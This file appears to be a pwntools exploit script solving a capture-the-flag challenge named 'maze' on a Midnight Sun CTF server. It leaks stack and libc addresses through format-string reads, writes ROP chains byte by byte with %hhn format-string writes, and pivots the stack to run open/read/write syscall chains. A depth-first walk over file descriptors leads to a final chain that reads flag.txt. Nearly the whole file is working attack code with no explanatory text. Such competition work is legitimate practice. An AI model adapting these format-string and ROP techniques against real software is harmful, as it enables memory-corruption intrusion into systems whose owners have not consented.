
from pwn import *
import time


g_pop_rdx_rbx = 0x0000000000162866
g_pop_rsi = 0x0000000000027529
g_pop_rdi = 0x0000000000026b72
g_pop_rax = 0x000000000004a550
g_syscall = 0x0000000000066229
g_pop_rsp = 0x0000000000032b5a
g_sub_rax_rdx = 0x000000000004a48c
g_mov_p_rdi_p_rsi = 0x00000000001621e9

g_mov_p_rdx_rax = 0x00000000000374b0


def make_win_rop(host_fd, base, stack):
    rop = b''

    data_off = 0x200
    buf = stack - 0x1000

    # open
    rop += p64(base + g_pop_rdi)
    rop += p64(stack + data_off)
    rop += p64(base + g_pop_rsi)
    rop += p64(0)
    rop += p64(base + g_pop_rdx_rbx)
    rop += p64(0)
    rop += p64(0)
    rop += p64(base + g_pop_rax)
    rop += p64(2)
    rop += p64(base + g_syscall)

    rop += p64(base + g_pop_rdx_rbx)
    rop += p64(stack + len(rop) + (8*4))
    rop += p64(0)
    rop += p64(base + g_mov_p_rdx_rax)

    # read
    rop += p64(base + g_pop_rdi)
    rop += p64(0) # fd << overwrite
    rop += p64(base + g_pop_rsi)
    rop += p64(buf)
    rop += p64(base + g_pop_rdx_rbx)
    rop += p64(0x100)
    rop += p64(0)
    rop += p64(base + g_pop_rax)
    rop += p64(0)
    rop += p64(base + g_syscall)

    # write
    rop += p64(base + g_pop_rdi)
    rop += p64(host_fd)
    rop += p64(base + g_pop_rsi)
    rop += p64(buf)
    rop += p64(base + g_pop_rdx_rbx)
    rop += p64(0x100)
    rop += p64(0)
    rop += p64(base + g_pop_rax)
    rop += p64(1)
    rop += p64(base + g_syscall)

    rop += b'a' * (data_off - len(rop))
    rop += b'flag.txt\x00'

    return rop

def make_rop(in_fd, out_fd, target_fd, base, stack):
    rop = b''

    max_len = 0x400
    buf = stack - 0x1000

    # read input
    rop += p64(base + g_pop_rdi)
    rop += p64(in_fd)
    rop += p64(base + g_pop_rsi)
    rop += p64(buf)
    rop += p64(base + g_pop_rdx_rbx)
    rop += p64(max_len)
    rop += p64(0)
    rop += p64(base + g_pop_rax)
    rop += p64(0)
    rop += p64(base + g_syscall)

    # copy target_fd
    rop += p64(base + g_pop_rsi)
    rop += p64(buf)
    rop += p64(base + g_pop_rdi)
    rop += p64(stack + len(rop) + (8*16))
    rop += p64(base + g_mov_p_rdi_p_rsi)
    rop += p64(base + g_pop_rsi)
    rop += p64(buf)
    rop += p64(base + g_pop_rdi)
    rop += p64(stack + len(rop) + (8*21))
    rop += p64(base + g_mov_p_rdi_p_rsi)

    # copy length
    rop += p64(base + g_pop_rdx_rbx) # subtract target
    rop += p64(8)
    rop += p64(0)
    rop += p64(base + g_sub_rax_rdx)
    rop += p64(base + g_pop_rdx_rbx)
    rop += p64(stack + len(rop) + (8*8))
    rop += p64(0)
    rop += p64(base + g_mov_p_rdx_rax)

    # write to target
    rop += p64(base + g_pop_rdi)
    rop += p64(target_fd)  ## << overwrite
    rop += p64(base + g_pop_rsi)
    rop += p64(buf + 8)
    rop += p64(base + g_pop_rdx_rbx)
    rop += p64(0) ## << overwrite
    rop += p64(0)
    rop += p64(base + g_pop_rax)
    rop += p64(1)
    rop += p64(base + g_syscall)

    # read from target
    rop += p64(base + g_pop_rdi)
    rop += p64(target_fd) ## << overwrite
    rop += p64(base + g_pop_rsi)
    rop += p64(buf)
    rop += p64(base + g_pop_rdx_rbx)
    rop += p64(max_len)
    rop += p64(0)
    rop += p64(base + g_pop_rax)
    rop += p64(0)
    rop += p64(base + g_syscall)

    # copy length
    rop += p64(base + g_pop_rdx_rbx)
    rop += p64(stack + len(rop) + (8*8))
    rop += p64(0)
    rop += p64(base + g_mov_p_rdx_rax)

    # write to host
    rop += p64(base + g_pop_rdi)
    rop += p64(out_fd)
    rop += p64(base + g_pop_rsi)
    rop += p64(buf)
    rop += p64(base + g_pop_rdx_rbx)
    rop += p64(0) ## << overwrite
    rop += p64(0)
    rop += p64(base + g_pop_rax)
    rop += p64(1)
    rop += p64(base + g_syscall)

    # loop
    rop += p64(base + g_pop_rsp)
    rop += p64(stack)

    return rop


def poll_until(r, key):
    d = b''
    while True:
        d += r.clean(timeout=0.2)
        if key in d:
            break
        print('~poll')
        if key == b'}':
            print(d)
        sendline(r, b'a')
    return d

PATH = []
def sendline(r, dat):
    global PATH
    d = b''
    for p in PATH:
        d += p64(p)
    d += dat
    print('sendline %s' % repr(PATH))
    r.sendline(d)

def get_leaks(r):
    sendline(r, b"SHOUT [%144$p/%209$p]")

    d = poll_until(r, b']').decode('latin-1')
    r.clean()
    stack_leak = d.split('[')[1].split('/')[0]
    stack_leak = int(stack_leak[2:], 16)

    libc_leak = d.split('/')[1].split(']')[0]
    libc_leak = int(libc_leak[2:], 16)

    libc_base = libc_leak - 2035656

    return libc_base, stack_leak

def get_leaks2(r):
    sendline(r, b"SHOUT [%146$p/%211$p]")

    d = poll_until(r, b']').decode('latin-1')
    r.clean()
    stack_leak = d.split('[')[1].split('/')[0]
    stack_leak = int(stack_leak[2:], 16)

    libc_leak = d.split('/')[1].split(']')[0]
    libc_leak = int(libc_leak[2:], 16)

    libc_base = libc_leak - 2035656

    return libc_base, stack_leak

def get_neighbors(r):
    print('stall...')
    time.sleep(0.1)
    sendline(r, b"SHOUT [%151$018p/%152$018p]")
    d = poll_until(r, b']').decode('latin-1')
    # print(d)

    pa = d.split('[')[1].split('/')[0][2:]
    pb = d.split('/')[1].split(']')[0][2:]

    a = int(pa[:8], 16)
    b = int(pa[8:], 16)
    c = int(pb[:8], 16)
    d = int(pb[8:], 16)

    n = [a,b,c,d] # 0x7ffcbbfb1af8 < ret
    # 0x7ffcbbfb1fa0 < fmt

    return n


def write_rop(rop, fmt_base, stack_base):

    fmt_idx_base = 100
    padding_size = ((fmt_idx_base - 42) * 8) + 2

    # sort bytes by value
    byte_addr = [(i, rop[i]) for i in range(len(rop))]
    byte_addr = sorted(byte_addr, key=lambda x: x[1])

    fmt = b''
    curr = 0

    for i, v in byte_addr:
        if v != curr:
            # add chars
            fmt += b'%' + str(v - curr).encode('ascii') + b'c'
            curr = v

        # write byte
        fmt += b'%' + str(fmt_idx_base + i).encode('ascii') + b'$hhn'

    # padding
    fmt += b'\x00' * (padding_size - len(fmt))

    # destination addresses
    for i in range(len(rop)):
        fmt += p64(stack_base + i)

    return fmt

def write_rop2(rop, fmt_base, stack_base):

    fmt_idx_base = 100
    padding_size = ((fmt_idx_base - 42) * 8) + 2

    # sort bytes by value
    byte_addr = [(i, rop[i]) for i in range(len(rop))]
    byte_addr = sorted(byte_addr, key=lambda x: x[1])

    fmt = b''
    curr = 0

    # fmt += b'%99$p/%100$p/%101$p'

    for i, v in byte_addr:
        if v != curr:
            # add chars
            fmt += b'%' + str(v - curr).encode('ascii') + b'c'
            curr = v

        # write byte
        fmt += b'%' + str(fmt_idx_base + i).encode('ascii') + b'$hhn'

    # padding
    fmt += b'\x00' * (padding_size - len(fmt))

    # destination addresses
    for i in range(len(rop)):
        fmt += p64(stack_base + i)

    return fmt

# -----------------------------------------------


def enter(r, fd_in, fd_out, fd_target):
    print('ENTER (%d,%d) <=> (%d)' % (fd_in, fd_out, fd_target))

    sendline(r, b'SHOUT asdf')
    r.clean()
    time.sleep(1)

    # leak stack and libc
    libc_base, stack_leak = get_leaks(r)

    print('[*] libc base: 0x%x' % libc_base)
    print('[*] stack leak: 0x%x' % stack_leak)

    # start of format string
    fmt_base = stack_leak - 1386

    # return address location
    rop_start = stack_leak - 1688

    rop = make_rop(fd_in, fd_out, fd_target, libc_base, rop_start - 0x2000)

    # write in chunks
    Z = 0x30
    for i in range(0, len(rop), Z):
        print('write %d' % i)
        fmt = write_rop(rop[i:i+Z], fmt_base, rop_start - 0x2000 + i)
        sendline(r, b'SHOUT ' + fmt)
        r.clean()
        time.sleep(0.05)

    # jump
    r2 = b''
    r2 += p64(libc_base + g_pop_rsp)
    r2 += p64(rop_start - 0x2000)

    print('hook')
    fmt = write_rop(r2, fmt_base, rop_start)

    # raw_input('...')

    sendline(r, b'SHOUT ' + fmt)
    time.sleep(1)

    r.clean()

# [(nil)/0x2f36312065646f6e/0x7469786528203631/0x29/(nil)/0x5638efec2040/0xf0b5ff/0xc2/0x7ffea0d186a7/0x7ffea0d186a6/0x26dd0a5fc5078700/0x7f4cd56eafc8/0x5638efec4cc0/0x5638efec36c0/0x7ffea0d187b0/(nil)/(nil)/(nil)/0x7f4cd55210b3/0x7f4cd571b620/0x7ffea0d187b8/0x400000000/0x5638efec3440/0x5638efec4cc0/0xe9d97c4763c8dfa8/0x5638efec36c0/0x7ffea0d187b0/(nil)/(nil)/0x16243de46e68dfa8]

def do_win(r, fd_host):
    print('WIN -> (%d)' % (fd_host))

    sendline(r, b'SHOUT asdf')
    r.clean()
    # time.sleep(1)

    # sendline(r, b"SHOUT [%100$p/%101$p/%102$p/%103$p/%104$p/%105$p/%106$p/%107$p/%108$p/%109$p/%110$p/%111$p/%112$p/%113$p/%114$p/%115$p/%116$p/%117$p/%118$p/%119$p/%120$p/%121$p/%122$p/%123$p/%124$p/%125$p/%126$p/%127$p/%128$p/%129$p/%130$p/%131$p/%132$p/%133$p/%134$p/%135$p/%136$p/%137$p/%138$p/%139$p/%140$p/%141$p/%142$p/%143$p/%144$p/%145$p/%146$p/%147$p/%148$p/%149$p/%150$p/%151$p/%152$p/%153$p/%154$p/%155$p/%156$p/%157$p/%158$p/%159$p/%160$p/%161$p/%162$p/%163$p/%164$p/%165$p/%166$p/%167$p/%168$p/%169$p/%170$p/%171$p/%172$p/%173$p/%174$p/%175$p/%176$p/%177$p/%178$p/%179$p/%180$p/%181$p/%182$p/%183$p/%184$p/%185$p/%186$p/%187$p/%188$p/%189$p/%190$p/%191$p/%192$p/%193$p/%194$p/%195$p/%196$p/%197$p/%198$p/%199$p]")
    # d = poll_until(r, b']').decode('latin-1')
    # print(d)

    # leak stack and libc
    libc_base, stack_leak = get_leaks2(r)

    print('[*] libc base: 0x%x' % libc_base)
    print('[*] stack leak: 0x%x' % stack_leak)

    # start of format string
    fmt_base = stack_leak - 1402

    # return address location
    rop_start = stack_leak - 1704

    rop = make_win_rop(fd_host, libc_base, rop_start - 0x2000)

    raw_input('...')

    # write in chunks
    Z = 0x30
    for i in range(0, len(rop), Z):
        print('write %d' % i)
        fmt = write_rop2(rop[i:i+Z], fmt_base, rop_start - 0x2000 + i)
        sendline(r, b'SHOUT ' + fmt)
        print(repr(fmt))
        print(r.clean())
        time.sleep(0.05)

    # jump
    r2 = b''
    r2 += p64(libc_base + g_pop_rsp)
    r2 += p64(rop_start - 0x2000)

    print('hook')
    fmt = write_rop(r2, fmt_base, rop_start)

    raw_input('...')

    sendline(r, b'SHOUT ' + fmt)
    # time.sleep(1)
    
    print(poll_until(r, b'}'))


def interact(r):
    while True:
        d = raw_input('$ ')
        if d == '\n':
            return
        sendline(r, d)
        print(r.clean())


def other(x):
    if x % 2 == 0:
        return x - 1
    else:
        return x + 1


def dfs(r, curr, cin, cout, path=[], seen=set([0,1])):
    global PATH
    PATH = path

    print('CURR node: %d' % curr)
    if curr == 16:
        print('win')
        do_win(r, cin)
        r.interactive()

    print(path, seen)

    # leak neighbor fds
    n = get_neighbors(r)

    for i in range(4):
        fd = n[i]
        if fd == 0xffffffff:
            continue

        if fd in seen:
            continue

        if fd == 0:
            continue

        cn = curr
        if i == 0: cn -= 1
        elif i == 1: cn -= 4
        elif i == 2: cn += 1
        elif i == 3: cn += 4

        enter(r, cin, cout, fd)
        dfs(r, cn, other(fd), other(fd), path + [fd], seen | set([fd, other(fd)]))


# r = process('./maze', env={'LD_PRELOAD': './libc.so.6'})
r = remote('pwn-maze-01.play.midnightsunctf.se', 10000)

# r.interactive()

dfs(r, 1, 0, 1)


# # leak neighbor fds
# n = get_neighbors(r)
# print(n)

# enter(r, n[0], n[0], n[1])
# PATH.append(n[1])

# # interact(r)

# n = get_neighbors(r)
# print(n)

# enter(r, n[0], n[0], n[1])


# 0x7ffd240ca1b6